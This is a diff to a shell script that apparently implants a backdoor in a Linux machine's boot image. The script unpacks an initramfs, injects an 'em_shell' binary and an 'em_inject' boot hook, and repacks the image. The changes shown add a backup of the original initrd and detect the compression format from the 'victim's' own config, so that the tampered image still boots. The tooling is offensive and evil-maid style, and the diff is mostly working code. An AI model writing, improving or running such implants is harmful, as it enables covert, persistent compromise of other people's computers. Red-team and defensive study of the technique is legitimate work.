@@ -67,6 +67,18 @@ INITRD="$BOOT_MOUNT/initrd.img-$KERNEL_VER"
 [ ! -f "$INITRD" ] && { echo "[!] initrd not found: $INITRD"; umount "$BOOT_MOUNT"; exit 1; }
 echo "[+] Target initrd : initrd.img-$KERNEL_VER"
 
+# ── Backup original initrd ────────────────────────────────────────────────────
+
+BAK_DIR="$BOOT_MOUNT/.bak"
+mkdir -p "$BAK_DIR"
+cp "$INITRD" "$BAK_DIR/initrd.img-$KERNEL_VER.bak" || {
+    echo "[!] Could not write backup to $BAK_DIR — aborting."
+    umount "$BOOT_MOUNT"
+    exit 1
+}
+echo "[+] Original initrd backed up to $BAK_DIR/initrd.img-$KERNEL_VER.bak"
+echo "    Restore with: cp $BAK_DIR/initrd.img-$KERNEL_VER.bak $INITRD"
+
 # ── Extract initramfs ─────────────────────────────────────────────────────────
 
 rm -rf "$WORK_DIR" && mkdir -p "$WORK_DIR"
@@ -104,24 +116,64 @@ chmod +x "$MAIN_DIR/scripts/local-bottom/em_inject"
 
 echo "[+] em_shell binary and hook injected into initramfs."
 
+# ── Detect compression ───────────────────────────────────────────────────────
+# Read from victim's own initramfs-tools config (most reliable source).
+# Falls back to lz4 which is the Ubuntu 22.04 default.
+
+COMPRESS="lz4"
+CONF="$MAIN_DIR/etc/initramfs-tools/initramfs.conf"
+if [ -f "$CONF" ]; then
+    DETECTED=$(grep "^COMPRESS=" "$CONF" | cut -d= -f2 | tr -d '[:space:]')
+    [ -n "$DETECTED" ] && COMPRESS="$DETECTED"
+fi
+echo "[+] Compression (from config): $COMPRESS"
+
+# Verify the required compressor is available and functional.
+# lz4 uses -l (legacy frame format) which is what the Linux kernel expects.
+# Fall back to gzip (universally available) if the tool is missing or broken.
+if [ "$COMPRESS" = "lz4" ]; then
+    if ! command -v lz4 &>/dev/null; then
+        echo "[!] lz4 not found — falling back to gzip. Install with: apt install lz4"
+        COMPRESS="gzip"
+    elif ! echo "test" | lz4 -9 -l > /dev/null 2>&1; then
+        echo "[!] lz4 smoke test failed — falling back to gzip."
+        COMPRESS="gzip"
+    else
+        echo "[+] lz4 verified OK."
+    fi
+elif [ "$COMPRESS" = "zstd" ]; then
+    if ! command -v zstd &>/dev/null; then
+        echo "[!] zstd not found — falling back to gzip. Install with: apt install zstd"
+        COMPRESS="gzip"
+    fi
+fi
+echo "[+] Compressor in use: $COMPRESS"
+
+compress_main() {
+    case "$COMPRESS" in
+        lz4)  lz4 -9 -l ;;
+        zstd) zstd -19 ;;
+        *)    gzip -9 ;;
+    esac
+}
+
 # ── Repack initramfs ──────────────────────────────────────────────────────────
-# Multi-section: early sections (microcode) are uncompressed cpio.
-# Main section uses gzip — universally supported by all kernels.
+# Multi-section: early/microcode sections must remain uncompressed cpio.
+# Main section uses the same compressor as the original.
 
 > "$NEW_INITRD"
 
 if [ "$MAIN_DIR" = "$WORK_DIR" ]; then
     # Single-section initramfs (typical in VMs)
-    (cd "$WORK_DIR" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
+    (cd "$WORK_DIR" && find . | cpio -H newc -o 2>/dev/null | compress_main) >> "$NEW_INITRD"
 else
     # Multi-section: iterate in sorted order, preserving section types
     for dir in $(ls -d "$WORK_DIR"/*/ 2>/dev/null | sort -V); do
         dir="${dir%/}"
         if [ "$dir" = "$MAIN_DIR" ]; then
-            # Main section: gzip compressed
-            (cd "$dir" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
+            (cd "$dir" && find . | cpio -H newc -o 2>/dev/null | compress_main) >> "$NEW_INITRD"
         else
-            # Early/microcode section: uncompressed cpio (kernel requirement)
+            # Early/microcode: always uncompressed cpio (kernel requirement)
             (cd "$dir" && find . | cpio -H newc -o 2>/dev/null) >> "$NEW_INITRD"
         fi
     done
